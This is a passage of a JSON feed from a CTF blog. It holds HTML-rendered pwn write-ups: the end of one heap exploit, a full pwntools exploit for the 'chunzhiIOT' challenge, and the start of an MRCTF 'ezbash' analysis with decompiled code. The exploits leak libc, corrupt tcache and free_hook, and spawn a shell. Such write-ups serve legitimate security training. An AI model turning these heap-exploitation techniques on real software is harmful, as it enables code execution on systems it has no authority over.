back()</span><br><span class=\"line\">    selectuser(idx)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Log:\\nXXXXXXXX&quot;</span>)</span><br><span class=\"line\">    addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    manage()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> addr</span><br><span class=\"line\"></span><br><span class=\"line\">getGM()</span><br><span class=\"line\"><span class=\"comment\">#leak the libc</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">manage()</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x4f0</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x410</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x4f0</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libc = show(<span class=\"number\">6</span>)-<span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">heap = show(<span class=\"number\">5</span>)</span><br><span class=\"line\">malloc_hook=libc +<span class=\"number\">0x1ecb70</span></span><br><span class=\"line\">free_hook =libc + <span class=\"number\">0x1eee48</span></span><br><span class=\"line\">system = libc + <span class=\"number\">0x0522c0</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libc))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap : &quot;</span>,<span class=\"built_in\">hex</span>(heap))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x3f0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x420</span>))</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x421</span>)+p64(heap-<span class=\"number\">0x420</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x3e0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;x&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x20</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/10/chunzhiIOT/",
            "url": "http://example.com/2022/05/10/chunzhiIOT/",
            "title": "chunzhiIOT",
            "date_published": "2022-05-10T10:25:33.000Z",
            "content_html": "<h1 id=\"202205-春秋杯-个人赛-chunzhiiot\"><a class=\"markdownIt-Anchor\" href=\"#202205-春秋杯-个人赛-chunzhiiot\">#</a> 202205 春秋杯 个人赛 ，chunzhiIOT</h1>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc= ELF(<span class=\"string\">&#x27;/home/dreamcat/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getadmin</span>():</span><br><span class=\"line\">\tpayload = <span class=\"string\">&quot;DEV /root/src HTTP/1.1 \\r\\nrotartsinimda\\x00  &quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package...&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">\tgdb.attach(r)</span><br><span class=\"line\">\tpause(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">\t<span class=\"comment\">#payload = &quot;POST /root/src HTTP/1.1 \\r\\n\\x01&amp;&#123;&#125;&amp;&#123;&#125;&amp;&#123;&#125;&quot;.format(str(idx),str(size),text)</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x01&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(size),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= text</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x02&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= text</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x03&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x04&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">getadmin()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x420</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">16</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x430</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Length: 6\\n&quot;</span>)</span><br><span class=\"line\">libc = u64(r.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1e0ff0</span></span><br><span class=\"line\">malloc_hook = libc+<span class=\"number\">0x1e0b90</span></span><br><span class=\"line\">free_hook = <span class=\"number\">0x1e3e20</span>+libc</span><br><span class=\"line\">realloc = libc + <span class=\"number\">0x097b20</span></span><br><span class=\"line\">system = libc + <span class=\"number\">0x4fa60</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libc))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;free_hook : &quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;realloc : &quot;</span>,<span class=\"built_in\">hex</span>(realloc))</span><br><span class=\"line\"><span class=\"comment\">#now we need wo leak a chunk address</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content-Length: 5\\n&quot;</span>)</span><br><span class=\"line\">heap_addr1 = (u64(r.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))&lt;&lt;<span class=\"number\">12</span>)+<span class=\"number\">0x6d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr1 : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr1))</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr2 = heap_addr1+<span class=\"number\">0x70</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">payload = p64((heap_addr2&gt;&gt;<span class=\"number\">12</span>)^(free_hook-<span class=\"number\">0x10</span>))</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x60</span>,p64(one_gadget))</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>,p64(<span class=\"number\">0xaaaaaaaaaaaaaaaa</span>)+p64(<span class=\"number\">0xbbbbbbbbbbbbbbbb</span>)+p64(system))</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">free(3)</span></span><br><span class=\"line\"><span class=\"string\">show(3)</span></span><br><span class=\"line\"><span class=\"string\">r.recvuntil(&quot;Content-Length: 5\\n&quot;)</span></span><br><span class=\"line\"><span class=\"string\">heap_addr2 = (u64(r.recvuntil(b&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12)</span></span><br><span class=\"line\"><span class=\"string\">print(&quot;heap_addr2 : &quot;,hex(heap_addr2))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">in glibc 2.33 tcache,</span></span><br><span class=\"line\"><span class=\"string\">if we put a new chunk in tcachebin,</span></span><br><span class=\"line\"><span class=\"string\">chunk-&gt;fd = ((chunk_user)&gt;&gt;12)^(last_freed_tcachechunk in this bin)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/25/MRCTF-ezbash/",
            "url": "http://example.com/2022/04/25/MRCTF-ezbash/",
            "title": "MRCTF_ezbash",
            "date_published": "2022-04-25T04:53:57.000Z",
            "content_html": "<h1 id=\"mrctf-pwnezbash\"><a class=\"markdownIt-Anchor\" href=\"#mrctf-pwnezbash\">#</a> MRCTF \tpwn\tezbash</h1>\n<p>拿到题目的时候，直接运行起来发现是一个文件系统，怀疑是不是一个 kernel 的题目，但是并没有给出内核文件，所以认定了就是一道堆题。这也是我坚持做下去的原因。</p>\n<h2 id=\"题目链接\"><a class=\"markdownIt-Anchor\" href=\"#题目链接\">#</a> 题目链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWFta2VjYXQvZHJlYW1rZWNhdC5naXRodWIuaW8vdHJlZS9tYWluL2NoYWxsZW5nZS9NUmN0Zl9lemJhc2g=\">https://github.com/dreamkecat/dreamkecat.github.io/tree/main/challenge/MRctf_ezbash</span></p>\n<h2 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ strings libc.so.6 |grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$  checksec --file=ezbash</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t7\t\tezbash</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ </span><br></pre></td></tr></table></figure>\n<p>2.31 的题目，保护全开，八成就是堆题；</p>\n<p>程序模拟了一个简单的文件系统，提供了 11 种命令，对于我们命令行的输出，程序会进行切片</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ ./ezbash</span><br><span class=\"line\">hacker:/$ <span class=\"built_in\">help</span></span><br><span class=\"line\">Welcome to ezbash</span><br><span class=\"line\">Just have fun here!</span><br><span class=\"line\">The following are built <span class=\"keyword\">in</span>:</span><br><span class=\"line\"><span class=\"built_in\">cd</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span></span><br><span class=\"line\"><span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">help</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">hacker:/$</span><br></pre></td></tr></table></figure>\n<p>解决题目的第一个难点就是对于代码的审计，因为命令太多，相较于传统的菜单堆题，这道题提供的命令太多，导致分析题目需要很多时间。</p>\n<h2 id=\"解题过程\"><a class=\"markdownIt-Anchor\" href=\"#解题过程\">#</a> 解题过程</h2>\n<h3 id=\"题目的整体把握\"><a class=\"markdownIt-Anchor\" href=\"#题目的整体把握\">#</a> 题目的整体把握</h3>\n<p>题目的所有文件的操作都是基于堆块，以及链表的数据结构</p>\n<p>重要的结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> file            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x40</span>, mappedto_9)</span><br><span class=\"line\"><span class=\"number\">00000000</span> flag            dd ?</span><br><span class=\"line\"><span class=\"number\">00000004</span> name            db <span class=\"number\">16</span> dup(?)            ; <span class=\"built_in\">string</span>(C)</span><br><span class=\"line\"><span class=\"number\">00000014</span> field_14        dd ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> context         dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000020</span> prev_bro        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000028</span> next_bro        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000030</span> futher          dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000038</span> firstson        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000040</span> file            ends</span><br></pre></td></tr></table></figure>\n<p>整个体系中，其实概括 i 起来就是对于目录以及文件的操作，而这些对象都是基于 file 的结构体。flag 标志，对应的是目录（文件夹）或者文件，flag=0，表示的是文件夹，flag=1 表示的文件。文件夹中的所有子文件以及子文件夹都会通过一个双链表联系起来。file 的 firstson 会储存子文件链表的头指针。头节点的 prev_bro 和尾节点的 neat_bro 为 0，name16 字节的数组是 file 的名字，文件夹还会记录自己的父文件夹是的指针。文件则不会，但是文件会有一个特殊的 context 指针，指向另外一个堆块，用于储存写入文件的内容。</p>\n<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *<span class=\"title function_\">readn</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  _BYTE *ptr; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"number\">0x150</span>;</span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = getchar();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">-1</span> || v3 == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    ptr[v2++] = v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 &gt;= v1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v1 += <span class=\"number\">0x150</span>;</span><br><span class=\"line\">      ptr = <span class=\"built_in\">realloc</span>(ptr, v1);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr[v2] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于我们输入的命令默认是存放在一个 0x161 的堆块，但是当我们输入的长度过长时，会调整堆块的大小，所以这里是不存在在溢出的，虽然结尾没有补零，但是每次都会被 v1=0x150 限制，没有溢出的利用。</p>\n<p>对于每条命令，他的解析不是直接的匹配，而是会对数据进行切片的处理，如下，调用 strtok 库函数，会返回 delim 的前地址（代码中可能是由于 idapro 分析错误， i = strtok (0LL, &quot;\\t\\r\\n\\a&quot;)，实际上会完全分析我们输入的命令，应该是 i = strtok (i, &quot;\\t\\r\\n\\a&quot;)）这里会将我们的命令分解成操作命令，对象，对吧对应字符串的地址保存在另一个堆块里面。strtok 遇到空字符结束。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_QWORD *__fastcall <span 